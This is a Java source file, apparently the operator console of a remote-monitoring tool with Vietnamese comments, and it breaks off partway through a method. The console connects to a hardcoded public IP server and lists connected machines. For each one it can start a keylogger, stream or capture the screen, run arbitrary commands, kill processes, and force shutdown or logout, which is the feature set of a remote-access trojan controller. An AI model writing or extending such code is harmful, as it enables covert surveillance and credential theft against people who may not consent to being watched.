import java.io.*;
import java.net.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.border.*;
import javax.swing.table.*;
import javax.swing.event.*;
import javax.swing.text.*;
import java.util.List;
import java.util.concurrent.*;
import org.json.*;
import java.util.Base64;
import java.util.regex.PatternSyntaxException;

public class SystemMonitorAdminClient extends JFrame {
    private static String SERVER_ADDRESS = "103.188.83.155";
    private static int SERVER_PORT = 50000;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private final String adminId;
    private ExecutorService executor;
    private ScheduledExecutorService scheduler;
    private Map<String, UserMonitorPanel> userPanels;
    private JTabbedPane tabbedPane;
    private JPanel usersListPanel;
    private List<String> connectedUsers;
    private DefaultListModel<String> userListModel;
    private JList<String> userList;
    private boolean isConnected = false;
    private long lastServerResponse = 0;
    private JLabel statusLabel;

    private boolean screenStreamActive = false;
    private boolean keyloggerActive = false;


    public static void main(String[] args) {
        try {
            // Set Nimbus look and feel if available
            for (UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (Exception e) {
            // If Nimbus is not available, use default
        }
        SwingUtilities.invokeLater(SystemMonitorAdminClient::new);
    }

    public SystemMonitorAdminClient() {
        adminId = generateClientId();
        executor = Executors.newCachedThreadPool();
        scheduler = Executors.newScheduledThreadPool(1);
        userPanels = new HashMap<>();
        connectedUsers = new ArrayList<>();

        setTitle("System Monitor - Admin Client");
        setSize(1200, 800);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        setVisible(true);
        // Set up GUI
        setupGUI();
        // Connect to server
        loadConfig();

        connectToServer();
    }

    private static void loadConfig() {
        try {
            // Xác định đường dẫn thư mục chương trình
            String programDir = getProgramDirectory();
            File configFile = new File(programDir, "configMonitorClient.ini");

            // Nếu file không tồn tại, tạo file với giá trị mặc định
            if (!configFile.exists()) {
                try (FileWriter writer = new FileWriter(configFile)) {
                    writer.write("SERVER_ADDRESS=127.0.0.1\nSERVER_PORT=50000");
                }
                System.out.println("[*] Đã tạo file cấu hình mặc định: " + configFile.getAbsolutePath());
                return; // Sử dụng giá trị mặc định
            }

            // Đọc file cấu hình
            Properties props = new Properties();
            props.load(new FileInputStream(configFile));

            // Lấy giá trị SERVER_ADDRESS
            String address = props.getProperty("SERVER_ADDRESS");
            if (address != null && !address.trim().isEmpty()) {
                SERVER_ADDRESS = address.trim();
                System.out.println("[*] Đã đọc SERVER_ADDRESS=" + SERVER_ADDRESS + " từ file cấu hình: " + configFile.getAbsolutePath());
            }

            // Lấy giá trị SERVER_PORT
            String portStr = props.getProperty("SERVER_PORT");
            if (portStr != null && !portStr.trim().isEmpty()) {
                try {
                    SERVER_PORT = Integer.parseInt(portStr.trim());
                    System.out.println("[*] Đã đọc SERVER_PORT=" + SERVER_PORT + " từ file cấu hình: " + configFile.getAbsolutePath());
                } catch (NumberFormatException e) {
                    System.err.println("[!] Giá trị SERVER_PORT không hợp lệ trong file cấu hình. Sử dụng giá trị mặc định: " + SERVER_PORT);
                }
            }
        } catch (IOException e) {
            System.err.println("[!] Lỗi đọc file cấu hình: " + e.getMessage());
            System.out.println("[*] Sử dụng giá trị mặc định: SERVER_ADDRESS=" + SERVER_ADDRESS + ", SERVER_PORT=" + SERVER_PORT);
        }
    }

    // Phương thức xác định thư mục chứa chương trình
    private static String getProgramDirectory() {
        try {
            // Lấy đường dẫn của class hiện tại - thay tên class tương ứng cho mỗi thành phần
            String path = SystemMonitorAdminClient.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            // Giải mã URL
            path = java.net.URLDecoder.decode(path, "UTF-8");

            File jarFile = new File(path);
            if (jarFile.isFile()) {  // Nếu là file JAR
                return jarFile.getParentFile().getAbsolutePath();
            } else {  // Nếu là thư mục class
                return jarFile.getAbsolutePath();
            }
        } catch (Exception e) {
            System.err.println("[!] Không thể xác định thư mục chương trình: " + e);
            // Trả về đường dẫn hiện tại nếu có lỗi
            return System.getProperty("user.dir");
        }
    }

    private String getLocalIPAddress() {
        try {
            // Get all network interfaces
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();

            // First look for a non-loopback IPv4 address
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();

                // Skip loopback, virtual or inactive interfaces
                if (networkInterface.isLoopback() || networkInterface.isVirtual() || !networkInterface.isUp()) {
                    continue;
                }

                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress address = addresses.nextElement();

                    // Prefer IPv4 addresses that are not loopback
                    if (address instanceof Inet4Address && !address.isLoopbackAddress()) {
                        return address.getHostAddress();
                    }
                }
            }

            // If no suitable IPv4 address was found, try IPv6 or any other address
            networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();

                if (!networkInterface.isLoopback() && networkInterface.isUp()) {
                    Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        InetAddress address = addresses.nextElement();
                        if (!address.isLoopbackAddress()) {
                            return address.getHostAddress();
                        }
                    }
                }
            }

            // If all else fails, return the local host address
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            // Return a default value if we can't get the IP address
            return "unknown-ip";
        }
    }

    private String generateClientId() {
        try {
            // Get hostname
            String hostname = InetAddress.getLocalHost().getHostName();

            // Get IP address
            String ipAddress = getLocalIPAddress();

            // Generate unique ID combining hostname, IP and random UUID
            return "Admin-" + hostname + "-" + ipAddress + "-" + UUID.randomUUID().toString().substring(0, 8);
        } catch (UnknownHostException e) {
            return "Admin-" + UUID.randomUUID().toString().substring(0, 8);
        }
    }

    private void setupGUI() {

        // Status bar at bottom
        statusLabel = new JLabel("Đang kết nối đến server...");
        statusLabel.setBorder(BorderFactory.createEmptyBorder(5, 10, 5, 10));

        // Main split pane
        JSplitPane splitPane = new JSplitPane();
        splitPane.setDividerLocation(250);

        // Users list panel (left side)
        usersListPanel = new JPanel(new BorderLayout());
        usersListPanel.setBorder(BorderFactory.createTitledBorder("Máy tính đang kết nối"));

        userListModel = new DefaultListModel<>();
        userList = new JList<>(userListModel);
        userList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        userList.addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                String selectedUser = userList.getSelectedValue();
                if (selectedUser != null) {
                    showUserTab(selectedUser);
                }
            }
        });

        // Double-click handler để mở tab
        userList.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                if (e.getClickCount() == 2) {
                    int index = userList.locationToIndex(e.getPoint());
                    if (index >= 0) {
                        String userId = userListModel.getElementAt(index);
                        showUserTab(userId);
                    }
                }
            }
        });

        // Add search box
        JPanel searchPanel = new JPanel(new BorderLayout());
        searchPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        JTextField searchField = new JTextField();
        searchField.setToolTipText("Tìm kiếm máy tính");
        searchPanel.add(new JLabel("Tìm kiếm: "), BorderLayout.WEST);
        searchPanel.add(searchField, BorderLayout.CENTER);

        // Add search functionality
        searchField.getDocument().addDocumentListener(new DocumentListener() {
            @Override
            public void insertUpdate(DocumentEvent e) {
                filterUsers(searchField.getText());
            }

            @Override
            public void removeUpdate(DocumentEvent e) {
                filterUsers(searchField.getText());
            }

            @Override
            public void changedUpdate(DocumentEvent e) {
                filterUsers(searchField.getText());
            }
        });

        JScrollPane userScrollPane = new JScrollPane(userList);
        usersListPanel.add(searchPanel, BorderLayout.NORTH);
        usersListPanel.add(userScrollPane, BorderLayout.CENTER);

        JPanel actionPanel = new JPanel();
        JButton refreshButton = new JButton("Làm mới");
        refreshButton.addActionListener(e -> requestUsersList());
        actionPanel.add(refreshButton);

        JButton monitorAllButton = new JButton("Theo dõi tất cả");
        monitorAllButton.addActionListener(e -> monitorAllUsers());
        actionPanel.add(monitorAllButton);

        JButton reconnectButton = new JButton("Kết nối lại");
        reconnectButton.addActionListener(e -> reconnectToServer());
        actionPanel.add(reconnectButton);

        // Thêm nút đóng tất cả tab
        JButton closeAllTabsButton = new JButton("Đóng tất cả");
        closeAllTabsButton.addActionListener(e -> {
            // Giữ lại tab Welcome
            while (tabbedPane.getTabCount() > 1) {
                tabbedPane.remove(1);
            }
        });
        actionPanel.add(closeAllTabsButton);

        usersListPanel.add(actionPanel, BorderLayout.SOUTH);

        // Monitoring panel (right side)
        tabbedPane = new JTabbedPane();
        JPanel welcomePanel = new JPanel(new BorderLayout());
        JLabel welcomeLabel = new JLabel("<html><body style='text-align:center'>" +
                "<h1>Ứng dụng Theo dõi Hệ thống</h1>" +
                "<p>Chọn một máy tính từ danh sách bên trái để bắt đầu theo dõi</p>" +
                "<p>ID của bạn: " + adminId + "</p>" +
                "</body></html>");
        welcomeLabel.setHorizontalAlignment(JLabel.CENTER);
        welcomePanel.add(welcomeLabel, BorderLayout.CENTER);
        tabbedPane.addTab("Trang chủ", welcomePanel);

        // Add the components to the split pane
        splitPane.setLeftComponent(usersListPanel);
        splitPane.setRightComponent(tabbedPane);

        // Add the split pane to the frame
        add(splitPane, BorderLayout.CENTER);
        add(statusLabel, BorderLayout.SOUTH);

    }

    private void filterUsers(String filter) {
        if (filter == null || filter.trim().isEmpty()) {
            // Show all users
            userListModel.clear();
            for (String user : connectedUsers) {
                userListModel.addElement(user);
            }
        } else {
            // Filter users
            userListModel.clear();
            for (String user : connectedUsers) {
                if (user.toLowerCase().contains(filter.toLowerCase())) {
                    userListModel.addElement(user);
                }
            }
        }
    }

    private void connectToServer() {
        try {
            socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            isConnected = true;
            lastServerResponse = System.currentTimeMillis();

            // Register with server
            JSONObject registration = new JSONObject();
            registration.put("type", "admin");
            registration.put("clientId", adminId);
            out.println(registration.toString());

            // Update status
            statusLabel.setText("Đã kết nối với server. Đang đợi danh sách máy tính...");

            // Start message handler
            new Thread(this::handleServerMessages).start();

        } catch (IOException | JSONException e) {
            System.err.println("Failed to connect to server: " + e.getMessage());
            isConnected = false;
            JOptionPane.showMessageDialog(this,
                    "Không thể kết nối đến server: " + e.getMessage(),
                    "Lỗi kết nối", JOptionPane.ERROR_MESSAGE);
            statusLabel.setText("Không thể kết nối đến server: " + e.getMessage());
        }
    }

    private void startHeartbeat() {
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (socket != null && socket.isConnected() && !socket.isClosed() && isConnected) {
                    JSONObject heartbeat = new JSONObject();
                    heartbeat.put("messageType", "heartbeat");
                    heartbeat.put("clientId", adminId);
                    out.println(heartbeat.toString());
                }
            } catch (Exception e) {
                System.err.println("Error sending heartbeat: " + e.getMessage());
                if (isConnected) {
                    isConnected = false;
                    SwingUtilities.invokeLater(() -> {
                        statusLabel.setText("Mất kết nối với server. Đang thử kết nối lại...");
                    });
                    reconnectToServer();
                }
            }
        }, 30, 30, TimeUnit.SECONDS);
    }

    private void startConnectionMonitor() {
        scheduler.scheduleAtFixedRate(() -> {
            // Check if we haven't heard from server for too long
            if (isConnected && System.currentTimeMillis() - lastServerResponse > 90000) { // 90 seconds
                System.err.println("No response from server for 90 seconds. Reconnecting...");
                isConnected = false;
                SwingUtilities.invokeLater(() -> {
                    statusLabel.setText("Không nhận được phản hồi từ server. Đang kết nối lại...");
                });
                reconnectToServer();
            }
        }, 30, 30, TimeUnit.SECONDS);
    }

    private void reconnectToServer() {
        // Close existing streams and socket
        try {
            if (in != null) in.close();
            if (out != null) out.close();
            if (socket != null) socket.close();
        } catch (Exception e) {
            // Ignore errors on closing
        }

        try {
            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Đang kết nối lại với server...");
            });

            socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            // Register with server
            JSONObject registration = new JSONObject();
            registration.put("type", "admin");
            registration.put("clientId", adminId);
            out.println(registration.toString());

            // Update status
            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Đã kết nối lại với server. Đang lấy danh sách máy tính...");
            });

            isConnected = true;

            // Start message handler
            new Thread(this::handleServerMessages).start();

        } catch (Exception e) {
            System.err.println("Failed to reconnect: " + e.getMessage());

            // Try again in 10 seconds
            scheduler.schedule(this::reconnectToServer, 10, TimeUnit.SECONDS);

            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Không thể kết nối lại: " + e.getMessage() + ". Thử lại sau 10 giây...");
            });
        }
    }

    private void handleServerMessages() {
        try {
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                processMessage(inputLine);
            }
        } catch (IOException e) {
            System.err.println("Connection to server lost: " + e.getMessage());
            isConnected = false;

            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Mất kết nối với server: " + e.getMessage() + ". Đang thử kết nối lại...");
                JOptionPane.showMessageDialog(this,
                        "Mất kết nối với server: " + e.getMessage() + "\nĐang thử kết nối lại...",
                        "Lỗi kết nối", JOptionPane.ERROR_MESSAGE);
            });

            // Try to reconnect
            reconnectToServer();
        } catch (Exception e) {
            System.err.println("Unexpected error in message handler: " + e.getMessage());
            e.printStackTrace();

            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Lỗi không mong đợi: " + e.getMessage());
                JOptionPane.showMessageDialog(this,
                        "Đã xảy ra lỗi không mong đợi: " + e.getMessage(),
                        "Lỗi", JOptionPane.ERROR_MESSAGE);
            });

            if (isConnected) {
                isConnected = false;
                reconnectToServer();
            }
        }
    }

    private void processMessage(String message) {
        try {
            JSONObject json = new JSONObject(message);
            String messageType = json.getString("messageType");

            SwingUtilities.invokeLater(() -> {
                try {
                    switch (messageType) {
                        case "connectedUsers":
                            updateUsersList(json.getJSONArray("users"));
                            statusLabel.setText("Đã kết nối với server. Số máy tính đang theo dõi: " + connectedUsers.size());
                            break;
                        case "userConnected":
                            addUser(json.getString("userId"));
                            statusLabel.setText("Máy tính mới kết nối: " + json.getString("userId"));
                            break;
                        case "userDisconnected":
                            // Chỉ cập nhật danh sách, không xóa khỏi giao diện
                            String userId = json.getString("userId");
                            if (!connectedUsers.contains(userId)) {
                                connectedUsers.add(userId);
                                userListModel.addElement(userId);
                            }
                            statusLabel.setText("Máy tính đã ngắt kết nối tạm thời: " + userId);
                            break;
                        case "systemInfoResponse":
                            updateSystemInfo(json);
                            break;
                        case "screenshotResponse":
                            updateScreenshot(json);
                            break;
                        case "processListResponse":
                            updateProcessList(json);
                            break;
                        case "commandResponse":
                            handleCommandResponse(json);
                            break;
                        case "keyLogData":
                            updateKeylogData(json);
                            break;
                        case "serverShutdown":
                            statusLabel.setText("Server đang tắt. Ứng dụng sẽ kết nối lại sau vài giây...");
                            JOptionPane.showMessageDialog(this,
                                    "Server đang tắt. Ứng dụng sẽ thử kết nối lại sau vài giây.",
                                    "Server đang tắt", JOptionPane.WARNING_MESSAGE);
                            isConnected = false;
                            reconnectToServer();
                            break;
                        case "error":
                            // Hiển thị thông báo lỗi một lần
                            String errorMsg = json.getString("error");
                            JOptionPane.showMessageDialog(this,
                                    "Lỗi: " + errorMsg,
                                    "Server báo lỗi", JOptionPane.ERROR_MESSAGE);

                            // Kiểm tra nếu lỗi liên quan đến client không kết nối
                            if (errorMsg.contains("is not connected")) {
                                // Trích xuất ID của client từ thông báo lỗi
                                userId = errorMsg.substring(errorMsg.indexOf("User ") + 5, errorMsg.indexOf(" is not"));

                                // Xóa client khỏi danh sách
                                if (connectedUsers.contains(userId)) {
                                    connectedUsers.remove(userId);
                                    userListModel.removeElement(userId);

                                    // Xóa tab nếu tồn tại
                                    UserMonitorPanel panel = userPanels.remove(userId);
                                    if (panel != null) {
                                        // Dọn dẹp tài nguyên
                                        panel.cleanup();

                                        // Xóa tab
                                        for (int i = 0; i < tabbedPane.getTabCount(); i++) {
                                            if (tabbedPane.getTitleAt(i).equals(userId)) {
                                                tabbedPane.remove(i);
                                                break;
                                            }
                                        }
                                    }

                                    statusLabel.setText("Đã xóa máy tính không kết nối: " + userId);
                                }
                            }
                            break;
                    }
                } catch (JSONException e) {
                    System.err.println("Error processing message on EDT: " + e.getMessage());
                }
            });
        } catch (JSONException e) {
            System.err.println("Error parsing message: " + e.getMessage());
        }
    }

    private void updateUsersList(JSONArray usersArray) throws JSONException {
        connectedUsers.clear();
        userListModel.clear();

        for (int i = 0; i < usersArray.length(); i++) {
            String userId = usersArray.getString(i);
            connectedUsers.add(userId);
            userListModel.addElement(userId);
        }
    }

    private void addUser(String userId) {
        if (!connectedUsers.contains(userId)) {
            connectedUsers.add(userId);
            userListModel.addElement(userId);
        }
    }

    private void removeUser(String userId) {
        // Xóa từ danh sách kết nối
        connectedUsers.remove(userId);
        userListModel.removeElement(userId);

        // Xóa tab nếu tồn tại
        UserMonitorPanel panel = userPanels.remove(userId);
        if (panel != null) {
            // Dọn dẹp tài nguyên
            panel.cleanup();

            // Tìm và xóa tab
            for (int i = 0; i < tabbedPane.getTabCount(); i++) {
                Component tabComponent = tabbedPane.getComponentAt(i);
                if (tabComponent == panel) {
                    tabbedPane.remove(i);
                    break;
                }
            }
        }
    }


    private void showUserTab(String userId) {
        // Kiểm tra nếu tab đã tồn tại
        // Kiểm tra xem userId đã có trong userPanels chưa
        if (userPanels.containsKey(userId)) {
            // Tab đã tồn tại, tìm và chọn nó
            UserMonitorPanel existingPanel = userPanels.get(userId);
            for (int i = 0; i < tabbedPane.getTabCount(); i++) {
                if (tabbedPane.getComponentAt(i) == existingPanel) {
                    tabbedPane.setSelectedIndex(i);
                    return;
                }
            }
        }

        try {
            // Tạo tab mới
            UserMonitorPanel userPanel = new UserMonitorPanel(userId);
            userPanels.put(userId, userPanel);

            // Thêm tab với nút đóng
            addTabWithCloseButton(tabbedPane, userId, userPanel);

            // Chọn tab mới
            tabbedPane.setSelectedComponent(userPanel);

            // Yêu cầu dữ liệu ban đầu
            requestSystemInfo(userId);
            requestProcessList(userId);
        } finally {

        }
    }

    // Phương thức để thêm tab với nút đóng
    private void addTabWithCloseButton(final JTabbedPane tabbedPane, final String title, final Component component) {
        // Tạo panel chứa tiêu đề và nút đóng
        JPanel tabPanel = new JPanel(new BorderLayout());
        tabPanel.setOpaque(false);

        JLabel titleLabel = new JLabel(title);
        titleLabel.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 5));

        JButton closeButton = new JButton("×");
        closeButton.setPreferredSize(new Dimension(20, 20));
        closeButton.setToolTipText("Đóng tab");
        closeButton.setContentAreaFilled(false);
        closeButton.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 0));
        closeButton.setFocusable(false);

        /*
        closeButton.addActionListener(e -> {

            int index = tabbedPane.indexOfComponent(component);
            if (index != -1) {
                tabbedPane.remove(index);
            }

            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Mất kết nối với server. Đang thử kết nối lại...");
            });
        });
*/
        //Cập nhật: Khi tắt tab thì tiến hành click tắt luôn stream màn hình và ghi logger để tránh lỗi phát sinh
        closeButton.addActionListener(e -> {
            // Kiểm tra nếu component là UserMonitorPanel và tắt stream, keylogger nếu đang bật
            if (component instanceof UserMonitorPanel) {
                UserMonitorPanel userPanel = (UserMonitorPanel) component;
                JToggleButton streamBtn = userPanel.getStreamButton();
                JToggleButton keylogBtn = userPanel.getKeloggerButton();

                if (streamBtn != null && streamBtn.isSelected()) {
                    // Kích hoạt sự kiện click để tắt stream
                    streamBtn.doClick();
                }

                if (keylogBtn != null && keylogBtn.isSelected()) {
                    // Kích hoạt sự kiện click để tắt keylog
                    keylogBtn.doClick();
                }
            }

            // Code hiện tại để đóng tab
            int index = tabbedPane.indexOfComponent(component);
            if (index != -1) {
                tabbedPane.remove(index);
            }

            SwingUtilities.invokeLater(() -> {
                statusLabel.setText("Đã đóng tab " + title);
            });
        });

        tabPanel.add(titleLabel, BorderLayout.WEST);
        tabPanel.add(closeButton, BorderLayout.EAST);

        // Thêm tab vào tabbed pane
        tabbedPane.addTab(null, component);
        tabbedPane.setTabComponentAt(tabbedPane.getTabCount() - 1, tabPanel);
    }

    private void requestUsersList() {
        // This is usually handled automatically by the server
        // when an admin connects, but we provide a refresh button
        if (isConnected) {
            statusLabel.setText("Đang làm mới danh sách máy tính...");
        } else {
            reconnectToServer();
        }
    }

    private void monitorAllUsers() {
        for (String userId : connectedUsers) {
            showUserTab(userId);
        }
    }

    private void requestSystemInfo(String userId) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "requestSystemInfo");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating system info request: " + e.getMessage());
        }
    }

    private void requestScreenshot(String userId) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "requestScreenshot");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating screenshot request: " + e.getMessage());
        }
    }

    private void requestProcessList(String userId) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "requestProcessList");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating process list request: " + e.getMessage());
        }
    }

    private void killProcess(String userId, int pid) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "killProcess");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);
            request.put("pid", pid);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating kill process request: " + e.getMessage());
        }
    }

    private void shutdownUser(String userId) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "shutdownUser");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());

            // Update panel to indicate action taken
            UserMonitorPanel panel = userPanels.get(userId);
            if (panel != null) {
                panel.indicateShutdown();
            }
        } catch (JSONException e) {
            System.err.println("Error creating shutdown request: " + e.getMessage());
        }
    }

    private void logoutUser(String userId) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "logoutUser");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());

            // Update panel to indicate action taken
            UserMonitorPanel panel = userPanels.get(userId);
            if (panel != null) {
                panel.indicateLogout();
            }
        } catch (JSONException e) {
            System.err.println("Error creating logout request: " + e.getMessage());
        }
    }

    private void toggleKeyLogger(String userId, boolean start) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", start ? "startKeyLogger" : "stopKeyLogger");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating keylogger request: " + e.getMessage());
        }
    }

    private void toggleScreenStream(String userId, boolean start) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", start ? "startScreenStream" : "stopScreenStream");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating screen stream request: " + e.getMessage());
        }
    }

    private void executeCommand(String userId, String command) {
        if (!isConnected) {
            statusLabel.setText("Không thể gửi yêu cầu - đã mất kết nối với server");
            return;
        }

        try {
            JSONObject request = new JSONObject();
            request.put("messageType", "executeCommand");
            request.put("adminId", adminId);
            request.put("targetUserId", userId);
            request.put("command", command);

            out.println(request.toString());
        } catch (JSONException e) {
            System.err.println("Error creating command request: " + e.getMessage());
        }
    }

    private void updateSystemInfo(JSONObject data) throws JSONException {
        // Check if this message is for this admin
        if (!data.getString("targetAdminId").equals(adminId)) {
            return;
        }

        // Get source user ID
        String userId = data.has("sourceUserId") ? data.getString("sourceUserId") : null;

        // Update the panel if it exists
        if (userId != null && userPanels.containsKey(userId)) {
            userPanels.get(userId).updateSystemInfo(data);
        }
    }

    private void updateScreenshot(JSONObject data) throws JSONException {
        // Check if this message is for this admin
        if (!data.getString("targetAdminId").equals(adminId)) {
            return;
        }

        // Get source user ID
        String userId = data.has("sourceUserId") ? data.getString("sourceUserId") : null;

        // Update the panel if it exists
        if (userId != null && userPanels.containsKey(userId)) {
            userPanels.get(userId).updateScreenshot(data);
        }
    }

    private void updateProcessList(JSONObject data) throws JSONException {
        // Check if this message is for this admin
        if (!data.getString("targetAdminId").equals(adminId)) {
            return;
        }

        // Get source user ID
        String userId = data.has("sourceUserId") ? data.getString("sourceUserId") : null;

        // Update the panel if it exists
        if (userId != null && userPanels.containsKey(userId)) {
            userPanels.get(userId).updateProcessList(data);
        }
    }

    private void handleCommandResponse(JSONObject data) throws JSONException {
        // Check if this message is for this admin
        if (!data.getString("targetAdminId").equals(adminId)) {
            return;
        }

        // Get source user ID
        String userId = data.has("sourceUserId") ? data.getString("sourceUserId") : null;

        // Update the panel if it exists
        if (userId != null && userPanels.containsKey(userId)) {
            userPanels.get(userId).handleCommandResponse(data);
        }
    }

    private void updateKeylogData(JSONObject data) throws JSONException {
        // Check if this message is for this admin
        if (!data.getString("targetAdminId").equals(adminId)) {
            return;
        }

        // Get source user ID
        String userId = data.has("sourceUserId") ? data.getString("sourceUserId") : null;

        // Update the panel if it exists
        if (userId != null && userPanels.containsKey(userId)) {
            userPanels.get(userId).updateKeylogData(data);
        }
    }

    private void shutdown() {
        try {
            isConnected = false;

            // Clean up thread pools
            if (executor != null) {
                executor.shutdownNow();
            }

            if (scheduler != null) {
                scheduler.shutdownNow();
            }

            // Close connections
            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null) socket.close();

            System.exit(0);
        } catch (IOException e) {
            System.err.println("Error shutting down client: " + e.getMessage());
            System.exit(1);
        }
    }

    // Inner class for monitoring a user
    private class UserMonitorPanel extends JPanel {
        private String userId;
        private JPanel systemInfoPanel;
        private JPanel screenshotPanel;
        private JPanel processesPanel;
        private JPanel commandsPanel;
        private JPanel keylogPanel;

        private JEditorPane systemInfoPane;
        private JLabel screenshotLabel;
        private JTable processTable;
        private DefaultTableModel processTableModel;
        private JTextArea commandOutputText;
        private JTextArea keylogText;
        private JCheckBox autoRefreshCheckbox;
        private JTextField cmdField; // Thêm khai báo biến cmdField tại đây


        private ScheduledExecutorService autoRefresh;
        private DefaultComboBoxModel<String> commandHistoryModel;
        private boolean isShutdown = false;
        private boolean isLoggedOut = false;
        private boolean isTemporarilyDisconnected = false;

        public void setTemporarilyDisconnected(boolean disconnected) {
            this.isTemporarilyDisconnected = disconnected;
            if (disconnected) {
                systemInfoPane.setText(systemInfoPane.getText() +
                        "\n\nĐang chờ máy kết nối lại...");
                screenshotLabel.setText("Đang chờ máy kết nối lại...");
            } else {
                // Cập nhật lại thông tin khi máy kết nối lại
                requestSystemInfo(userId);
                requestProcessList(userId);
            }
        }

        public UserMonitorPanel(String userId) {
            this.userId = userId;
            this.autoRefresh = Executors.newScheduledThreadPool(1);

            setLayout(new BorderLayout());

            // Create tabbed pane for different monitoring sections
            JTabbedPane monitorTabs = new JTabbedPane();

            // System info panel
            systemInfoPanel = createSystemInfoPanel();
            monitorTabs.addTab("Thông tin hệ thống", systemInfoPanel);

            // Screenshot panel
            screenshotPanel = createScreenshotPanel();
            monitorTabs.addTab("Màn hình", screenshotPanel);

            // Processes panel
            processesPanel = createProcessesPanel();
            monitorTabs.addTab("Tiến trình", processesPanel);

            // Commands panel
            commandsPanel = createCommandsPanel();
            monitorTabs.addTab("Lệnh hệ thống", commandsPanel);

            // Keylogger panel
            keylogPanel = createKeylogPanel();
            monitorTabs.addTab("Ghi phím", keylogPanel);

            add(monitorTabs, BorderLayout.CENTER);

            // Control panel at bottom
            add(createControlPanel(), BorderLayout.SOUTH);

            // Start auto-refresh for system info
            startAutoRefresh();
        }

        private JPanel createSystemInfoPanel() {
            JPanel panel = new JPanel(new BorderLayout());
            panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

            // Use JTextArea for text display instead of HTML
            systemInfoPane = new JEditorPane();
            systemInfoPane.setContentType("text/plain");
            systemInfoPane.setEditable(false);
            JScrollPane scrollPane = new JScrollPane(systemInfoPane);
            panel.add(scrollPane, BorderLayout.CENTER);

            JPanel controlPanel = new JPanel();
            JButton refreshButton = new JButton("Làm mới");
            refreshButton.addActionListener(e -> requestSystemInfo(userId));
            controlPanel.add(refreshButton);

            panel.add(controlPanel, BorderLayout.SOUTH);

            return panel;
        }

        private JToggleButton streamButton;

        public JToggleButton getStreamButton() {
            return streamButton;
        }

        private JPanel createScreenshotPanel() {
            JPanel panel = new JPanel(new BorderLayout());
            panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

